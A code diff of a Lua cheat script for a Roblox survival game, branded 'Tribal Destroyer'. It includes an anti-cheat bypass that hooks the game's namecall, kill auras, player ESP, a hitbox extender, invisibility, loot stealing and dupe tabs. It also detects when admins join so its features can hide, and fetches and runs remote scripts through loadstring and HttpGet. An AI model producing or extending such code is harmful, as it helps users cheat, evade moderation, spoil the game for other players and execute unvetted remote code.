-    Bypassing = false;
     AutoPickup2 = false;
     InfJump = false;
     ClickTp = false;
@@ -566,7 +264,6 @@ local AllSwords = {173, 205, 230, 369, 255, 254, 253}
 local AllBows = {174, 197, 198, 199, 376}
 local AllBooks = {281, 282, 283, 284, 285, 286, 287, 296, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 323, 362}
 local AllStaffs = {293, 292, 291, 290, 162, 289}
-local AllSoulSet = {201, 202, 203, 204}
 
 --Safe Death Connections
 local TimeTped
@@ -587,125 +284,108 @@ local AutoPickupOnSquidDeath
 local ItemIndexed
 local ItemIndexedNumber
 
---Admin Module
-local Players = game:GetService("Players")
-
--- Define a list of admin user IDs
-local adminUserIDs = {
-    -- Add user IDs of admins here
-    162080939,
-    987654321,
-}
-
--- Function to check if a player is an admin
-local function isAdmin(player)
-    return table.find(adminUserIDs, player.UserId) ~= nil
-end
-
--- Function to kill a player
-local function killPlayer(player)
-    local Character = GetCharacter(player.name)
-    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
-    if humanoid then
-        humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-    end
-end
-
--- Function to kick a player
-local function kickPlayer(player, targetPlayer)
-    if targetPlayer and targetPlayer ~= player then
-        targetPlayer:Kick("You have been kicked by an admin.")
-    end
-end
-
--- Function to freeze a player
-local function freezePlayer(player)
-    local character = GetCharacter(player.name)
-
-    if character then
-        local rootPart = character:FindFirstChild("HumanoidRootPart")
-        if rootPart then
-            rootPart.Anchored = true
-        end
-    end
-end
-
--- Function to unfreeze a player
-local function unfreezePlayer(player)
-    local character = GetCharacter(player.name)
-    if character then
-        local rootPart = character:FindFirstChild("HumanoidRootPart")
-        if rootPart then
-            rootPart.Anchored = false
-        end
-    end
-end
-
--- Function to handle player chat and check for admin commands
-local function onPlayerChat(player, message)
-    if isAdmin(player) then
-        if message:lower():sub(1, 5) == ".kill" then
-            local playerNameToKill = message:sub(7)
-            local targetPlayer = Players:FindFirstChild(playerNameToKill)
-            killPlayer(targetPlayer)
-        elseif message:lower():sub(1, 5) == ".kick" then
-            local playerNameToKick = message:sub(7)
-            local targetPlayer = Players:FindFirstChild(playerNameToKick)
-            kickPlayer(player, targetPlayer)
-        elseif message:lower():sub(1, 7) == ".freeze" then
-            local playerNameToFreeze = message:sub(9)
-            local targetPlayer = Players:FindFirstChild(playerNameToFreeze)
-            freezePlayer(targetPlayer)
-        elseif message:lower():sub(1, 9) == ".unfreeze" then
-            local playerNameToUnfreeze = message:sub(11)
-            local targetPlayer = Players:FindFirstChild(playerNameToUnfreeze)
-            unfreezePlayer(targetPlayer)
-        end
-    end
-end
-
--- Listen for chat messages from all players
-for _, player in pairs(Players:GetPlayers()) do
-    player.Chatted:Connect(function(msg)
-        onPlayerChat(player, msg)
-    end)
-end
-
--- Listen for new players and their chat messages
-Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(msg)
-        onPlayerChat(player, msg)
-    end)
-end)
-
 --Aimbot locals
 local CurrentlyLocked
-local Aiming = false
-
---Quickspeed locals
-local OnOff = false
-local keydetected
 
 -- ============================================================
---  PAGES (TABS)
+--  LOAD ATLAS UI (WITH ERROR HANDLING)
 -- ============================================================
-local Main = AtlasUi:CreatePage("Main")
-local Combat = AtlasUi:CreatePage("Combat")
-local Farming = AtlasUi:CreatePage("Farm")
-local Teleports = AtlasUi:CreatePage("Teleports")
-local LPlayer = AtlasUi:CreatePage("LocalPlayer")
-local Dupe = AtlasUi:CreatePage("Dupe")
-local AutoSell = AtlasUi:CreatePage("AutoSell")
-local RepairTab = AtlasUi:CreatePage("Repair")
-local Credits = AtlasUi:CreatePage("Credits")
+local AtlasUi = nil
+local function MakeNotification(title, desc, time)
+    if AtlasUi and AtlasUi.Notify then
+        AtlasUi:Notify({Title = title, Content = desc, Duration = time})
+    else
+        warn("Notification: " .. title .. " - " .. desc)
+    end
+end
+
+local success, err = pcall(function()
+    local AtlasModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRealGamer903/IslandTribesObliterator/refs/heads/main/Atlas"))()
+    if AtlasModule then
+        AtlasUi = AtlasModule.new({
+            Name = "Tribal Destroyer";
+            ConfigFolder = "TribalDestroyer";
+            Credit = "Credits: dd on Discord";
+            Color = Color3.fromRGB(180, 0, 255);
+            UseLoader = true;
+            Bind = "LeftBracket";
+            FullName = "Tribal Destroyer";
+            CheckKey = nil;
+            Discord = "https://discord.gg/LWare";
+        })
+    end
+end)
+
+if not AtlasUi then
+    warn("Atlas UI failed to load: " .. tostring(err))
+    warn("Creating fallback UI...")
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "TribalDestroyerFallback"
+    screenGui.Parent = CoreGui
+    
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 500, 0, 400)
+    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+    mainFrame.BackgroundTransparency = 0.2
+    mainFrame.Parent = screenGui
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.BackgroundColor3 = Color3.fromRGB(180, 0, 255)
+    title.BackgroundTransparency = 0.3
+    title.Text = "Tribal Destroyer V2 (Fallback Mode)"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBold
+    title.Parent = mainFrame
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -20, 1, -60)
+    label.Position = UDim2.new(0, 10, 0, 50)
+    label.BackgroundTransparency = 1
+    label.Text = "Atlas UI failed to load.\n\nPress LeftBracket ( [ ) to toggle this menu.\n\nAll features are still functional.\n\nCheck console for errors (F9)."
+    label.TextColor3 = Color3.fromRGB(200, 200, 255)
+    label.TextScaled = true
+    label.Font = Enum.Font.GothamMedium
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.TextYAlignment = Enum.TextYAlignment.Top
+    label.Parent = mainFrame
+    
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 50, 0, 30)
+    closeBtn.Position = UDim2.new(1, -60, 1, -40)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    closeBtn.BackgroundTransparency = 0.3
+    closeBtn.Text = "X"
+    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeBtn.TextScaled = true
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.Parent = mainFrame
+    closeBtn.MouseButton1Click:Connect(function()
+        screenGui.Enabled = false
+    end)
+    
+    UserInputService.InputBegan:Connect(function(input, gp)
+        if gp then return end
+        if input.KeyCode == Enum.KeyCode.LeftBracket then
+            screenGui.Enabled = not screenGui.Enabled
+        end
+    end)
+    
+    MakeNotification = function(title, desc, time)
+        warn("Notification: " .. title .. " - " .. desc)
+    end
+end
 
 --stop everything if an admin joins
 Players.PlayerAdded:Connect(function(admin)
     if table.find(realgameadmins, admin.UserId) then
         if admin.UserId == '134488231' then
-            MakeAtlasNotification('Owner Joined', "Owner joined; careful, I'll disable everything for you", 30)
+            MakeNotification('Owner Joined', "Owner joined; careful, I'll disable everything for you", 30)
         else
-            MakeAtlasNotification("Game Admin Joined: "..admin.Name, "Admin joined; careful, I'll disable everything for you", 30)
+            MakeNotification("Game Admin Joined: "..admin.Name, "Admin joined; careful, I'll disable everything for you", 30)
         end
         task.spawn(function()
             repeat task.wait(1)
@@ -716,9 +396,9 @@ Players.PlayerAdded:Connect(function(admin)
                 end
             until not Players:FindFirstChild(admin.Name)
             if admin.UserId == '134488231' then
-                MakeAtlasNotification('Owner left', "Interesting interaction", 30)
+                MakeNotification('Owner left', "Interesting interaction", 30)
             else
-                MakeAtlasNotification('Admin left', "Ok the admin is gone.", 15)
+                MakeNotification('Admin left', "Ok the admin is gone.", 15)
             end
         end)
     end
@@ -728,7 +408,6 @@ end)
 if not getgenv().bypassing then
     getgenv().bypassing = true
     local bypassac
-
     bypassac = hookmetamethod(game, '__namecall', function(self, ...)
         local args = {...}
         if not checkcaller() and self == RemoteEvents['Sonar'] then
@@ -771,22 +450,6 @@ function GetClosestChest()
             end
         end
         return closest
-    end
-end
-
-local function IsArmorLevel(piece)
-    if getgenv().LevelCheck == 'False' then return true end
-    local lvl = piece:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Level'):FindFirstChild('Label').Text:gsub("Lv ", "")
-    if tonumber(lvl) == 10 then
-        return true
-    end
-end
-
-local function IsLevel(piece)
-    if getgenv().LevelCheck == 'False' then return true end
-    local lvl = piece:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Level'):FindFirstChild('Label').Text:gsub("Lv ", "")
-    if tonumber(lvl) == 5 then
-        return true
     end
 end
 
@@ -907,7 +570,6 @@ function AutoEat()
         local foodtable = {}
         local highestfood
         local greatestfoodpossible = -math.huge
-        
         for _, food in pairs(MyInventory:GetChildren()) do
             if food.Name == 'Raw Potato' or food.Name == 'Watermelon' or food.Name == 'Banana' or food.Name == 'Redberry' or food.Name == 'Coconut' or food.Name == 'Baked Potato' or food.Name == 'Carrot'  or food.Name == 'Cabbage' or food.Name == 'Cooked Fish' or food.Name == 'Cooked Meat' or food.Name == 'Caveberry' or food.Name == 'Slime Ball' or food.Name == 'Lucky Fruit' then
                 table.insert(foodtable, food)
@@ -1193,7 +855,7 @@ function SafeDeath()
                             getgenv().configs.EvilSkeleton = false
                             local SavePlayer = TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(3, Enum.EasingStyle.Linear), {CFrame = CFrame.new(Vector3.new(7135, 73, 18677))})
                             SavePlayer:Play()
-                            MakeAtlasNotification("You have been saved from death!", "The Arc Angels have saved you! Heal Up before you go back to battle!", 7)
+                            MakeNotification("You have been saved from death!", "The Arc Angels have saved you! Heal Up before you go back to battle!", 7)
                             TeleportHappened = true
                             TimeTped = tick()
                         end
@@ -1224,12 +886,12 @@ function OpKillAura()
                     end
                     if LocalPlayer.Character.Humanoid.Health <= 20 then
                         LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7137, 73, 18673)
-                        MakeAtlasNotification("You are low!", 'Ive saved you. Heal up.', 8)
+                        MakeNotification("You are low!", 'Ive saved you. Heal up.', 8)
                     return end
                     MyYPos = LocalPlayer.Character.HumanoidRootPart.CFrame.Y
                     if MyYPos <= -800 then
                         LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7137, 73, 18673)
-                        MakeAtlasNotification("Suicide", "Careful, hes trying to suicide you", 3)
+                        MakeNotification("Suicide", "Careful, hes trying to suicide you", 3)
                     return end
                     RemoteEvents['ToolAction']:FireServer(OpKillAuraTable[1].Character)
                     if not getgenv().configs.OpKillAura and LocalPlayer.Character.Humanoid.Health > 25 then
@@ -1316,7 +978,7 @@ function AutoRepairClub()
                                 if ClosestChest then
                                     RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, 230)
                                     RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, 230)
-                                    MakeAtlasNotification('Repaired', 'Club repaired', 1)
+                                    MakeNotification('Repaired', 'Club repaired', 1)
                                     task.wait(0.2)
                                     pcall(function()
                                         if MyInventory:FindFirstChild('Obsidian Club') then
@@ -1347,8 +1009,7 @@ function AutoRepairClub()
                                         if ClosestChest then
                                             RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, 230)
                                             RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, 230)
-                                            MakeAtlasNotification('Repaired', 'Club repaired', 1)
-
+                                            MakeNotification('Repaired', 'Club repaired', 1)
                                             task.wait(0.2)
                                             pcall(function()
                                                 if MyInventory:FindFirstChild('Obsidian Club') then
@@ -1816,7 +1477,7 @@ function PlayerEsp()
             Box.Thickness = 1
             Box.Transparency = 1
             Box.Filled = false
-            Box.Color = Color3.fromRGB(180, 0, 255) -- PURPLE NEON
+            Box.Color = Color3.fromRGB(180, 0, 255)
             
             local Healthbaroutline = Drawing.new('Square')
             Healthbaroutline.Thickness = 1
@@ -1828,7 +1489,7 @@ function PlayerEsp()
             Healthbar.Thickness = 1
             Healthbar.Filled = false
             Healthbar.Transparency = 1
-            Healthbar.Color = Color3.fromRGB(180, 0, 255) -- PURPLE NEON
+            Healthbar.Color = Color3.fromRGB(180, 0, 255)
             EspRenderStepped = RunService.RenderStepped:Connect(function()
                 if getgenv().configs.PlayerEsp == false then
                     if Boxoutline then
@@ -1903,6 +1564,24 @@ function PlayerEsp()
 end
 
 -- ============================================================
+--  CREATE UI TABS (Atlas)
+-- ============================================================
+if not AtlasUi then
+    warn("AtlasUi is nil! Cannot create UI.")
+    return
+end
+
+local Main = AtlasUi:CreatePage("Main")
+local Combat = AtlasUi:CreatePage("Combat")
+local Farming = AtlasUi:CreatePage("Farm")
+local Teleports = AtlasUi:CreatePage("Teleports")
+local LPlayer = AtlasUi:CreatePage("LocalPlayer")
+local Dupe = AtlasUi:CreatePage("Dupe")
+local AutoSell = AtlasUi:CreatePage("AutoSell")
+local RepairTab = AtlasUi:CreatePage("Repair")
+local Credits = AtlasUi:CreatePage("Credits")
+
+-- ============================================================
 --  MAIN TAB
 -- ============================================================
 local MainSection = Main:CreateSection("Main")
@@ -1913,9 +1592,9 @@ MainSection:CreateToggle({
     Flag = 'RememberConfigs',
     Callback = function(Value)
         if Value then
-            MakeAtlasNotification('Config Memory', 'Config memory has been enabled', 2)
+            MakeNotification('Config Memory', 'Config memory has been enabled', 2)
         else
-            MakeAtlasNotification('Config Memory', 'Config memory has been disabled', 2)
+            MakeNotification('Config Memory', 'Config memory has been disabled', 2)
         end
         return Value
     end
@@ -1925,7 +1604,7 @@ MainSection:CreateButton({
     Name = 'AC Bypass',
     Callback = function()
         if not IsPlayerAlive(LocalPlayer) then
-            MakeAtlasNotification('Not alive', 'Maybe click the play button?', 5)
+            MakeNotification('Not alive', 'Maybe click the play button?', 5)
             return
         end
         if IsPlayerAlive(LocalPlayer) then
@@ -1936,7 +1615,7 @@ MainSection:CreateButton({
                 RemoteEvents['Sonar']:FireServer()
                 myroot.CFrame = oldpos
             end
-            MakeAtlasNotification('AC Bypass', 'AntiCheat bypass has been enabled', 3)
+            MakeNotification('AC Bypass', 'AntiCheat bypass has been enabled', 3)
         end
     end
 })
@@ -1946,7 +1625,7 @@ MainSection:CreateInteractable({
     ActionText = 'Execute',
     Callback = function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source', true))()
-        MakeAtlasNotification('Infinite Yield', 'Infinite Yield has been executed', 2)
+        MakeNotification('Infinite Yield', 'Infinite Yield has been executed', 2)
     end
 })
 
@@ -1956,7 +1635,7 @@ MainSection:CreateKeybind({
     Flag = 'AutoPickup',
     KeyPressed = function()
         AutoPickup()
-        MakeAtlasNotification('AutoPickup', 'AutoPickup has been triggered', 1)
+        MakeNotification('AutoPickup', 'AutoPickup has been triggered', 1)
     end
 })
 
@@ -1968,16 +1647,16 @@ MainSection:CreateToggle({
         getgenv().configs.AutoPickup2 = Value
         AutoPickup2()
         if Value then
-            MakeAtlasNotification('AutoPickup', 'AutoPickup has been enabled', 2)
+            MakeNotification('AutoPickup', 'AutoPickup has been enabled', 2)
         else
-            MakeAtlasNotification('AutoPickup', 'AutoPickup has been disabled', 2)
+            MakeNotification('AutoPickup', 'AutoPickup has been disabled', 2)
         end
     end
 })
 
 MainSection:CreateButton({
     Name = 'Steal any op loot on ground',
-    Callback = function(Value)
+    Callback = function()
         local function FindFunnyClosestItem()
             local closest
             local range = math.huge
@@ -2004,9 +1683,9 @@ MainSection:CreateButton({
             task.wait(0.2)
             AutoPickup()
             LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
-            MakeAtlasNotification('Loot Steal', 'OP loot has been stolen successfully', 2)
+            MakeNotification('Loot Steal', 'OP loot has been stolen successfully', 2)
         else
-            MakeAtlasNotification('wah wah wahhh', 'noting good on da floor :(', 3)
+            MakeNotification('wah wah wahhh', 'noting good on da floor :(', 3)
         end
     end
 })
@@ -2021,9 +1700,9 @@ MiscSection:CreateToggle({
         getgenv().configs.ClickTp = Value
         ClickTp()
         if Value then
-            MakeAtlasNotification('Ctrl+Click TP', 'Ctrl+Click TP has been enabled', 2)
+            MakeNotification('Ctrl+Click TP', 'Ctrl+Click TP has been enabled', 2)
         else
-            MakeAtlasNotification('Ctrl+Click TP', 'Ctrl+Click TP has been disabled', 2)
+            MakeNotification('Ctrl+Click TP', 'Ctrl+Click TP has been disabled', 2)
         end
     end
 })
@@ -2036,9 +1715,9 @@ MiscSection:CreateToggle({
         getgenv().configs.MineAura = Value
         MineAura()
         if Value then
-            MakeAtlasNotification('Mine Aura', 'Mine Aura has been enabled', 2)
+            MakeNotification('Mine Aura', 'Mine Aura has been enabled', 2)
         else
-            MakeAtlasNotification('Mine Aura', 'Mine Aura has been disabled', 2)
+            MakeNotification('Mine Aura', 'Mine Aura has been disabled', 2)
         end
     end
 })
@@ -2059,7 +1738,7 @@ MiscSection:CreateButton({
                 LocalPlayer.Character.Hitbox:Destroy()
             end
             LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(oldpos)
-            MakeAtlasNotification('Invisible', 'You are now invisible', 2)
+            MakeNotification('Invisible', 'You are now invisible', 2)
         end
     end
 })
@@ -2076,7 +1755,7 @@ MiscSection:CreateButton({
                 Respawn:Disconnect()
                 return
             end)
-            MakeAtlasNotification('Visible', 'Respawning character...', 2)
+            MakeNotification('Visible', 'Respawning character...', 2)
         end
     end
 })
@@ -2095,20 +1774,20 @@ MiscSection:CreateButton({
             local b = MakeTween(Vector3.new(-1838, 46, -3189))
             b:Play()
             b.Completed:Wait()
-            local c =  MakeTween(Vector3.new(5825, 76, -3258))
+            local c = MakeTween(Vector3.new(5825, 76, -3258))
             c:Play()
             c.Completed:Wait()
-            local d =  MakeTween(Vector3.new(5330, 36, -7372))
+            local d = MakeTween(Vector3.new(5330, 36, -7372))
             d:Play()
             d.Completed:Wait()
-            local e =  MakeTween(Vector3.new(4782, 74, -5208))
+            local e = MakeTween(Vector3.new(4782, 74, -5208))
             e:Play()
             e.Completed:Wait()
-            local f =  MakeTween(Vector3.new(-152, 106, -4079))
+            local f = MakeTween(Vector3.new(-152, 106, -4079))
             f:Play()
             f.Completed:Wait()
             LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = oldpos
-            MakeAtlasNotification('Map Rendered', 'Map assets have been loaded', 2)
+            MakeNotification('Map Rendered', 'Map assets have been loaded', 2)
         end
     end
 })
@@ -2141,29 +1820,29 @@ MiscSection:CreateToggle({
                                 task.spawn(function()
                                     if CheckTeleport(plr.Character.HumanoidRootPart, plr.Character.HumanoidRootPart.Position) then
                                         Reason = 'Teleporting'
-                                        MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
+                                        MakeNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                     end
                                     _G.cooldown = 0.5
                                 end)
                                 if plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.PlatformStanding then
                                     Reason = 'Flying'
-                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
+                                    MakeNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                     _G.cooldown = 3
                                 elseif plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated and max > 60 then
                                     Reason = 'Vehicle Fly/Speed'
-                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
+                                    MakeNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                     _G.cooldown = 1
                                 elseif max > 80 and max ~= maxvelocity[2] then
                                     Reason = 'Excessive Speed'
-                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
+                                    MakeNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                     _G.cooldown = 1
                                 elseif plr.Character.Humanoid.WalkSpeed > 24 then
                                     Reason = 'Speed'
-                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
+                                    MakeNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                     _G.cooldown = 1
                                 elseif plr.Character.Humanoid.JumpPower > 80 then
                                     Reason = 'Jump Power'
-                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
+                                    MakeNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                     _G.cooldown = 1
                                 end
                             end
@@ -2175,9 +1854,9 @@ MiscSection:CreateToggle({
         getgenv().configs.CheaterDetector = Value
         CheaterDetector()
         if Value then
-            MakeAtlasNotification('Hacker Detector', 'Hacker Detector has been enabled', 2)
+            MakeNotification('Hacker Detector', 'Hacker Detector has been enabled', 2)
         else
-            MakeAtlasNotification('Hacker Detector', 'Hacker Detector has been disabled', 2)
+            MakeNotification('Hacker Detector', 'Hacker Detector has been disabled', 2)
         end
     end
 })
@@ -2197,9 +1876,9 @@ KillAuraSection:CreateToggle({
         getgenv().configs.KillAura = Value
         KillAura()
         if Value then
-            MakeAtlasNotification('Kill Aura', 'Kill Aura has been enabled', 2)
+            MakeNotification('Kill Aura', 'Kill Aura has been enabled', 2)
         else
-            MakeAtlasNotification('Kill Aura', 'Kill Aura has been disabled', 2)
+            MakeNotification('Kill Aura', 'Kill Aura has been disabled', 2)
         end
     end
 })
@@ -2215,7 +1894,7 @@ KillAuraSection:CreateTextBox({
         for _, plr in pairs(Players:GetPlayers()) do
             if string.find(plr.Name:lower(), args:lower()) or string.find(plr.DisplayName:lower(), args:lower()) then
                 table.insert(Whitelist_table, plr.Name)
-                MakeAtlasNotification("Player added to whitelist", plr.Name .. ' was added to the whitelist table', 3)
+                MakeNotification("Player added to whitelist", plr.Name .. ' was added to the whitelist table', 3)
                 return
             end
         end
@@ -2234,7 +1913,7 @@ KillAuraSection:CreateTextBox({
             if string.find(plr.Name:lower(), args:lower()) or string.find(plr.DisplayName:lower(), args:lower()) then
                 if table.find(Whitelist_table, plr.Name) then
                     table.remove(Whitelist_table, table.find(Whitelist_table, plr.Name))
-                    MakeAtlasNotification("Player removed from whitelist", plr.Name .. ' was removed from the whitelist', 3)
+                    MakeNotification("Player removed from whitelist", plr.Name .. ' was removed from the whitelist', 3)
                     return
                 end
             end
@@ -2252,9 +1931,9 @@ CloseCombatSection:CreateToggle({
         getgenv().configs.PlayerLock = Value
         PlayerLock()
         if Value then
-            MakeAtlasNotification('Player Lock', 'Player Lock has been enabled', 2)
+            MakeNotification('Player Lock', 'Player Lock has been enabled', 2)
         else
-            MakeAtlasNotification('Player Lock', 'Player Lock has been disabled', 2)
+            MakeNotification('Player Lock', 'Player Lock has been disabled', 2)
         end
     end
 })
@@ -2267,9 +1946,9 @@ CloseCombatSection:CreateToggle({
         getgenv().configs.Pumpkins = Value
         Pumpkins()
         if Value then
-            MakeAtlasNotification('Auto Heal', 'Auto Heal has been enabled', 2)
+            MakeNotification('Auto Heal', 'Auto Heal has been enabled', 2)
         else
-            MakeAtlasNotification('Auto Heal', 'Auto Heal has been disabled', 2)
+            MakeNotification('Auto Heal', 'Auto Heal has been disabled', 2)
         end
     end
 })
@@ -2289,9 +1968,9 @@ CloseCombatSection:CreateToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('Hitbox Extender', 'Hitbox Extender has been enabled', 2)
+            MakeNotification('Hitbox Extender', 'Hitbox Extender has been enabled', 2)
         else
-            MakeAtlasNotification('Hitbox Extender', 'Hitbox Extender has been disabled', 2)
+            MakeNotification('Hitbox Extender', 'Hitbox Extender has been disabled', 2)
         end
     end
 })
@@ -2307,15 +1986,15 @@ CloseCombatSection:CreateSliderToggle({
     ToggleFlag = "EscapeDeathToggle",
     SliderCallback = function(Value) 
         TimeBetweenTps = Value
-        MakeAtlasNotification('Escape Death Time', 'Time set to: ' .. tostring(Value) .. ' seconds', 2)
+        MakeNotification('Escape Death Time', 'Time set to: ' .. tostring(Value) .. ' seconds', 2)
     end,
     ToggleCallback = function(Value)  
         getgenv().configs.SafeDeath = Value
         SafeDeath()
         if Value then
-            MakeAtlasNotification('Escape Death', 'Escape Death has been enabled', 2)
+            MakeNotification('Escape Death', 'Escape Death has been enabled', 2)
         else
-            MakeAtlasNotification('Escape Death', 'Escape Death has been disabled', 2)
+            MakeNotification('Escape Death', 'Escape Death has been disabled', 2)
         end
     end
 })
@@ -2333,7 +2012,7 @@ AdvancedKillAuraSection:CreateTextBox({
         for _, plr in pairs(Players:GetPlayers()) do
             if string.find(plr.Name:lower(), Value:lower()) or string.find(plr.DisplayName:lower(), Value:lower()) then
                 table.insert(OpKillAuraTable, 1, plr)
-                MakeAtlasNotification("Entered "..plr.Name, 'You are going to target ' ..plr.Name .. ' >:)', 3)
+                MakeNotification("Entered "..plr.Name, 'You are going to target ' ..plr.Name .. ' >:)', 3)
                 return
             end
         end
@@ -2350,15 +2029,15 @@ AdvancedKillAuraSection:CreateSliderToggle({
     ToggleFlag = "OPKillAura",
     SliderCallback = function(Value) 
         getgenv().PredictAmount = Value
-        MakeAtlasNotification('Prediction Distance', 'Set to: ' .. tostring(Value), 2)
+        MakeNotification('Prediction Distance', 'Set to: ' .. tostring(Value), 2)
     end,
     ToggleCallback = function(Value)  
         getgenv().configs.OpKillAura = Value
         OpKillAura()
         if Value then
-            MakeAtlasNotification('OP Kill Aura', 'OP Kill Aura has been enabled', 2)
+            MakeNotification('OP Kill Aura', 'OP Kill Aura has been enabled', 2)
         else
-            MakeAtlasNotification('OP Kill Aura', 'OP Kill Aura has been disabled', 2)
+            MakeNotification('OP Kill Aura', 'OP Kill Aura has been disabled', 2)
         end
     end
 })
@@ -2370,9 +2049,9 @@ AdvancedKillAuraSection:CreateToggle({
     Callback = function(Value)
         getgenv().configs.PredictOpKillAura = Value
         if Value then
-            MakeAtlasNotification('Predict Mode', 'Predict has been enabled', 2)
+            MakeNotification('Predict Mode', 'Predict has been enabled', 2)
         else
-            MakeAtlasNotification('Predict Mode', 'Predict has been disabled', 2)
+            MakeNotification('Predict Mode', 'Predict has been disabled', 2)
         end
     end
 })
@@ -2387,9 +2066,9 @@ CombatMiscsSection:CreateToggle({
         getgenv().configs.MobAura = Value
         MobAura()
         if Value then
-            MakeAtlasNotification('Mob Aura', 'Mob Aura has been enabled', 2)
+            MakeNotification('Mob Aura', 'Mob Aura has been enabled', 2)
         else
-            MakeAtlasNotification('Mob Aura', 'Mob Aura has been disabled', 2)
+            MakeNotification('Mob Aura', 'Mob Aura has been disabled', 2)
         end
     end
 })
@@ -2400,7 +2079,7 @@ CombatMiscsSection:CreateKeybind({
     Flag = 'TrapPlayer',
     KeyPressed = function()
         TrapPlayer()
-        MakeAtlasNotification('Trap Player', 'Trap has been placed', 1)
+        MakeNotification('Trap Player', 'Trap has been placed', 1)
     end
 })
 
@@ -2411,12 +2090,12 @@ CombatMiscsSection:CreateDropdown({
     ItemSelecting = true,
     Callback = function(Value)
        getgenv().configs.TrapType = Value 
-       MakeAtlasNotification('Trap Type', 'Trap set to: ' .. Value, 2)
+       MakeNotification('Trap Type', 'Trap set to: ' .. Value, 2)
     end
 })
 
 -- ============================================================
---  FARM TAB (Includes Resources and Treasure Chest content)
+--  FARM TAB
 -- ============================================================
 local TreeFarmSection = Farming:CreateSection('Tree Farm')
 
@@ -2428,14 +2107,13 @@ TreeFarmSection:CreateToggle({
         getgenv().configs.ConfierFarm = Value
         ConiferFarm()
         if Value then
-            MakeAtlasNotification('Conifer Farm', 'Conifer Farm has been enabled', 2)
+            MakeNotification('Conifer Farm', 'Conifer Farm has been enabled', 2)
         else
-            MakeAtlasNotification('Conifer Farm', 'Conifer Farm has been disabled', 2)
+            MakeNotification('Conifer Farm', 'Conifer Farm has been disabled', 2)
         end
     end
 })
 
--- RESOURCES CONTENT MOVED HERE
 local OreFindingSection = Farming:CreateSection('Ore Finding')
 
 OreFindingSection:CreateButton({
@@ -2452,12 +2130,12 @@ OreFindingSection:CreateButton({
             end
         end
         if OrePositionTable[1] == nil then
-            MakeAtlasNotification("No "..getgenv().OreType.. ' Gangy', 'There is no '..getgenv().OreType.. ' :(', 3)
+            MakeNotification("No "..getgenv().OreType.. ' Gangy', 'There is no '..getgenv().OreType.. ' :(', 3)
         else
             if IsPlayerAlive(LocalPlayer) then
                 local myroot = LocalPlayer.Character.HumanoidRootPart
                 myroot.CFrame = CFrame.new(OrePositionTable[1] + Vector3.new(0, 5, 0))
-                MakeAtlasNotification('Ore Found', 'Teleported to ' .. getgenv().OreType, 2)
+                MakeNotification('Ore Found', 'Teleported to ' .. getgenv().OreType, 2)
             end
         end
     end
@@ -2470,7 +2148,7 @@ OreFindingSection:CreateDropdown({
     ItemSelecting = true,
     Callback = function(Value)
         getgenv().OreType = Value 
-        MakeAtlasNotification('Ore Type', 'Set to: ' .. Value, 2)
+        MakeNotification('Ore Type', 'Set to: ' .. Value, 2)
     end
 })
 
@@ -2489,12 +2167,12 @@ MiscFindingSection:CreateButton({
             end
         end
         if MiscPositionsTable[1] == nil then
-            MakeAtlasNotification("No "..getgenv().MiscItems.. ' Gangy', 'There is no '..getgenv().MiscItems.. ' :(', 3)
+            MakeNotification("No "..getgenv().MiscItems.. ' Gangy', 'There is no '..getgenv().MiscItems.. ' :(', 3)
         else
             if IsPlayerAlive(LocalPlayer) then
                 local myroot = LocalPlayer.Character.HumanoidRootPart
